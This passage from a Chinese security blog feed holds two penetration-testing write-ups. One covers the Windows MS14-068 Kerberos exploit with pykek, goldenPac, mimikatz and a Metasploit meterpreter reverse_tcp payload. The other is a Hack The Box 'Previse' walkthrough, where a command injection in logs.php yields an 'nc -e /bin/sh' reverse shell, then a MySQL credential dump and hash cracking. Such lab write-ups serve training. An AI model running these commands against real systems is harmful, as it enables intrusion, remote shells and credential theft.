<ntlmHash>:在没有明文密码的情况下，通过NTLM Hash登录。</ntlmHash></clearPassword></domainControlerAddr></userSid></domainName></userName></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p域成员密码</span><br><span class="line"> </span><br><span class="line">pytho脚本n案例：python ms14-068.py -u administrator@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-500 -d 10.10.10.10 -p 11</span><br><span class="line">exe案例：ms14-068.exe -u win7dc1@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-1120 -d 10.10.10.10 -p passwd</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/Downloads/pykek-master]</span><br><span class="line">└─# python ms14-068.py -u win7dc1@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-1120 -d 10.10.10.10 -p passwd        1 ⨯</span><br><span class="line">  [+] Building AS-REQ for 10.10.10.10... Done!</span><br><span class="line">  [+] Sending AS-REQ to 10.10.10.10... Done!</span><br><span class="line">  [+] Receiving AS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Parsing AS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Building TGS-REQ for 10.10.10.10... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 10.10.10.10... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Creating ccache file &#x27;TGT_win7dc1@jiye.net.ccache&#x27;... Done!</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/Downloads/pykek-master]</span><br></pre></td></tr></table></figure><p><code>导出票据到mimikatz目录下并清除票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><p><code>注入票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;TGT_win7dc1@jiye.net.ccache&quot;</span><br></pre></td></tr></table></figure><p><code>列出目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure><h3 id="2-goldenPac-py"><a href="#2-goldenPac-py" class="headerlink" title="2.goldenPac.py"></a>2.goldenPac.py</h3><p><code>安装Kerberos客户端</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install krb5-user -y</span><br></pre></td></tr></table></figure><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 goldenPac.py jiye.net/Administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure><h3 id="3-msf模块利用"><a href="#3-msf模块利用" class="headerlink" title="3.msf模块利用"></a>3.msf模块利用</h3><p><code>生成票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure><p><code>msf不支持bin文件，所以转换票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::clist &quot;.......bin&quot; /export</span><br></pre></td></tr></table></figure><p><code>之后反弹meterpreter shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi 票据</span><br></pre></td></tr></table></figure><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/local/current_user_psexec </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set TECHNIQUE PSH</span><br><span class="line">TECHNIQUE =&gt; PSH</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set RHOSTS jiye.net</span><br><span class="line">RHOSTS =&gt; win2008.hello.com</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set lhost 10.10.10.130</span><br><span class="line">lhost =&gt; 1.1.1.5</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; run</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;在通常情况下、即使拥有管理员权限,也无法读取域控制器中的C:\Windwos\NTDS\ntds.dit文件(活动目录始终访问这个文件，所以文件被禁止读取)。使用Windows本地卷影拷贝服务可以获得文件的副本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x01-域控中-卷影拷贝服务提取ntds-dit&quot;&gt;&lt;a href=&quot;#0x01-域控中-卷影拷贝服务提取ntds-dit&quot; class=&quot;headerlink&quot; title=&quot;0x01.(域控中)卷影拷贝服务提取ntds.dit&quot;&gt;&lt;/a&gt;0x01.(域控中)卷影拷贝服务提取ntds.dit&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;在活动目录中,所有的数据都保存在 ntds.dit文件中。ntds.dit是一个二进制文件,存储位置为域控制器的%SystemRoot%ntds\ntds.dit。ntds.dit 中包含(但不限于)用户名、散列值、组、GPP、OU等与活动目录相关的信息。它和SAM文件一样，是被Windows操作系统锁定的。本节将介绍如何从系统中导出ntds.dit,以及如何读取ntds.dit中的信息。在一般情况下,系统运维人员会利用卷影拷贝服务（Volume Shadow Copy Service, VSS）实现这些操作。VSS本质上属快照（Snapshot)技术的一种，主要用于备份和恢复（即使目标文件处于锁定状态）。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Previse</title>
    <link href="https://lunamoore.github.io/2021/08/16/HTB-Previse/"/>
    <id>https://lunamoore.github.io/2021/08/16/HTB-Previse/</id>
    <published>2021-08-16T12:29:51.000Z</published>
    <updated>2021-08-16T12:35:07.157Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2021/08/16/HTB-Previse/image-20210816113010834.png" class><a id="more"></a><h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01.信息搜集"></a>0x01.信息搜集</h2><p><code>可以看到只开放了22与80端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/Previse]</span><br><span class="line">└─# nmap -sC -sV -sT 10.10.11.104 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 08:54 EDT</span><br><span class="line">Nmap scan report for 10.10.11.104</span><br><span class="line">Host is up (0.60s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)</span><br><span class="line">|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)</span><br><span class="line">|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">| http-title: Previse Login</span><br><span class="line">|_Requested resource was login.php</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 80.49 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><p><code>只有一个登入框。尝试弱口令无果</code></p><img src="/2021/08/16/HTB-Previse/image-20210816113441214.png" class><h2 id="0x03-扫目录"><a href="#0x03-扫目录" class="headerlink" title="0x03.扫目录"></a>0x03.扫目录</h2><p><code>其他都需要登入后才可以访问，只有nav.php可以访问</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/Previse]</span><br><span class="line">└─# gobuster dir -u http://10.10.11.104 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 50 -x php     </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://10.10.11.104</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 50</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/15 23:38:09 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/nav.php              (Status: 200) [Size: 1248]</span><br><span class="line">/footer.php           (Status: 200) [Size: 217] </span><br><span class="line">/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]</span><br><span class="line">/download.php         (Status: 302) [Size: 0] [--&gt; login.php]   </span><br><span class="line">/header.php           (Status: 200) [Size: 980]                 </span><br><span class="line">/files.php            (Status: 302) [Size: 4914] [--&gt; login.php]</span><br><span class="line">/login.php            (Status: 200) [Size: 2224]                </span><br><span class="line">/config.php           (Status: 200) [Size: 0]                   </span><br><span class="line">/accounts.php         (Status: 302) [Size: 3994] [--&gt; login.php]</span><br><span class="line">/status.php           (Status: 302) [Size: 2968] [--&gt; login.php]</span><br><span class="line">/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.104/css/]</span><br><span class="line">/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.104/js/] </span><br><span class="line">/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                 </span><br><span class="line">/logs.php             (Status: 302) [Size: 0] [--&gt; login.php]                 </span><br><span class="line">                                                                              </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/16 00:12:43 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x04-访问nav-php"><a href="#0x04-访问nav-php" class="headerlink" title="0x04.访问nav.php"></a>0x04.访问nav.php</h2><p><code>可以看到创建用户链接，但是都重定向了</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124236847.png" class><p><code>burp抓包，修改响应码</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124349179.png" class><p><code>修改为200放过</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124426566.png" class><p><code>可以看到可以创建用户了</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124516603.png" class><h2 id="0x05-登入"><a href="#0x05-登入" class="headerlink" title="0x05.登入"></a>0x05.登入</h2><p><code>创建admin用户后登入</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124731679.png" class><p><code>在flies标签下可以上传文件，但不能利用。并有网站备份文件且可以下载，那就下载下来</code></p><img src="/2021/08/16/HTB-Previse/image-20210816124934439.png" class><p><code>查看backup，其中config.php与logs.php有用，审计代码，发现delim参数处存在命令注入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">config.php</span><br><span class="line">得到数据用户与密码</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function connectDB()&#123;</span><br><span class="line">    $host = &#x27;localhost&#x27;;</span><br><span class="line">    $user = &#x27;root&#x27;;</span><br><span class="line">    $passwd = &#x27;mySQL_p@ssw0rd!:)&#x27;;</span><br><span class="line">    $db = &#x27;previse&#x27;;</span><br><span class="line">    $mycon = new mysqli($host, $user, $passwd, $db);</span><br><span class="line">    return $mycon;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">logs.php</span><br><span class="line">日志输出系统为python写的(/opt/scripts/log_process.py)</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#x27;user&#x27;])) &#123;</span><br><span class="line">    header(&#x27;Location: login.php&#x27;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (!$_SERVER[&#x27;REQUEST_METHOD&#x27;] == &#x27;POST&#x27;) &#123;</span><br><span class="line">    header(&#x27;Location: login.php&#x27;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//</span><br><span class="line">/////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">output = <span class="built_in">exec</span>(<span class="string">&quot;/usr/bin/python /opt/scripts/log_process.py &#123;<span class="variable">$_POST</span>[&#x27;delim&#x27;]&#125;&quot;</span>);</span></span><br><span class="line">echo $output;</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">filepath = <span class="string">&quot;/var/www/out.log&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">filename = <span class="string">&quot;out.log&quot;</span>;    </span></span><br><span class="line"></span><br><span class="line"><span class="meta">if(file_exists($</span><span class="bash">filepath)) &#123;</span></span><br><span class="line">    header(&#x27;Content-Description: File Transfer&#x27;);</span><br><span class="line">    header(&#x27;Content-Type: application/octet-stream&#x27;);</span><br><span class="line">    header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.basename($filepath).&#x27;&quot;&#x27;);</span><br><span class="line">    header(&#x27;Expires: 0&#x27;);</span><br><span class="line">    header(&#x27;Cache-Control: must-revalidate&#x27;);</span><br><span class="line">    header(&#x27;Pragma: public&#x27;);</span><br><span class="line">    header(&#x27;Content-Length: &#x27; . filesize($filepath));</span><br><span class="line">    ob_clean(); // Discard data in the output buffer</span><br><span class="line">    flush(); // Flush system headers</span><br><span class="line">    readfile($filepath);</span><br><span class="line">    die();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    http_response_code(404);</span><br><span class="line">    die();</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x06-漏洞验证"><a href="#0x06-漏洞验证" class="headerlink" title="0x06.漏洞验证"></a>0x06.漏洞验证</h2><p><code>kali监听6666端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 6666                                                                                                               1 ⨯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>curl探测</code></p><img src="/2021/08/16/HTB-Previse/image-20210816173652411.png" class><p><code>kali回显</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 6666                                                                                                               1 ⨯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.11.104] 35806</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 10.10.17.216:6666</span><br><span class="line">User-Agent: curl/7.58.0</span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x07-反弹shell"><a href="#0x07-反弹shell" class="headerlink" title="0x07.反弹shell"></a>0x07.反弹shell</h2><p><code>kali继续监听</code>\</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 6666                                                                                                               1 ⨯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>nc反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.10.17.216 6666</span><br></pre></td></tr></table></figure><img src="/2021/08/16/HTB-Previse/image-20210816173943815.png" class><p><code>kali接到shell，得到的shell非交互，不能登入mysql</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# nc -nvlp 6666                                                                                                               1 ⨯</span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [10.10.17.216] from (UNKNOWN) [10.10.11.104] 35844</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>升级交互shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@previse:/var/www/html$ </span><br><span class="line"></span><br><span class="line">www-data@previse:/var/www/html$</span><br></pre></td></tr></table></figure><h2 id="0x08-登入mysql"><a href="#0x08-登入mysql" class="headerlink" title="0x08.登入mysql"></a>0x08.登入mysql</h2><p><code>获取m4lwhere密码md5值</code></p><blockquote><p>$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">www-data@previse:/var/www/html$ mysql -uroot -p</span><br><span class="line">mysql -uroot -p</span><br><span class="line">Enter password: mySQL_p@ssw0rd!:)</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5810</span><br><span class="line">Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2021, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show databases;</span></span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| previse            |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> use previse;</span></span><br><span class="line">use previse;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show tables;</span></span><br><span class="line">show tables;</span><br><span class="line">+-------------------+</span><br><span class="line">| Tables_in_previse |</span><br><span class="line">+-------------------+</span><br><span class="line">| accounts          |</span><br><span class="line">| files             |</span><br><span class="line">+-------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> desc accounts;</span></span><br><span class="line">desc accounts;</span><br><span class="line">+------------+--------------+------+-----+-------------------+----------------+</span><br><span class="line">| Field      | Type         | Null | Key | Default           | Extra          |</span><br><span class="line">+------------+--------------+------+-----+-------------------+----------------+</span><br><span class="line">| id         | int(11)      | NO   | PRI | NULL              | auto_increment |</span><br><span class="line">| username   | varchar(50)  | NO   | UNI | NULL              |                |</span><br><span class="line">| password   | varchar(255) | NO   |     | NULL              |                |</span><br><span class="line">| created_at | datetime     | YES  |     | CURRENT_TIMESTAMP |                |</span><br><span class="line">+------------+--------------+------+-----+-------------------+----------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from accounts;</span></span><br><span class="line">select * from accounts;</span><br><span class="line">+----+----------+------------------------------------+---------------------+</span><br><span class="line">| id | username | password                           | created_at          |</span><br><span class="line">+----+----------+------------------------------------+---------------------+</span><br><span class="line">|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |</span><br><span class="line">|  2 | admin    | $1$🧂llol$uXqzPW6SXUONt.AIOBqLy. | 2021-08-16 09:11:44 |</span><br><span class="line">|  3 | simon    | $1$🧂llol$XiMVTMY58ITU/9mYPenku0 | 2021-08-16 09:13:39 |</span><br><span class="line">|  4 | newguy   | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-16 10:42:19 |</span><br><span class="line">|  5 | jonny    | $1$🧂llol$wzYjWk/p5usz8BzxvPrXs1 | 2021-08-16 10:44:39 |</span><br><span class="line">+----+----------+------------------------------------+---------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure><p><code>john破解hash值</code></p><blockquote><p>ilovecody112235!</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/Previse]</span><br><span class="line">└─# john -format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt userhash </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and 